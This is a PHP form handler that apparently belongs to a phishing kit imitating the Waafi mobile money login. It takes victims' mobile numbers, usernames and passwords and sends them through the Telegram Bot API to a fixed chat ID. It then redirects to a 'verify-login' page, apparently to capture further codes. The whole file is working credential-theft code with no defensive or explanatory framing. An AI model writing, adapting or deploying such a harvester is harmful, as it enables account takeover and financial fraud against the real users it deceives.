<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $mobile   = trim($_POST['mobile'] ?? '');
    $package  = trim($_POST['package'] ?? '');

    if ($username === '' || $password === '' || $mobile === '') {
        die('All fields are required.');
    }

    $botToken = "YOUR_BOT_TOKEN";
    $chatId   = "1135238504";

    $text = "Waafi Website Message\n\n"
          . "mobile: $mobile\n"
          . "username: $username\n"
          . "password: $password";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text'    => $text
    ];

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        header('Location: verify-login.php');
        exit;
    }

    $result = json_decode($response, true);

    if (isset($result['ok']) && $result['ok'] === true) {
        $query = http_build_query([
            'mobile'  => $mobile,
            'package' => $package
        ]);

        header("Location: verify-login.php?$query");
        exit;
    }

    header('Location: verify-login.php');
    exit;
}
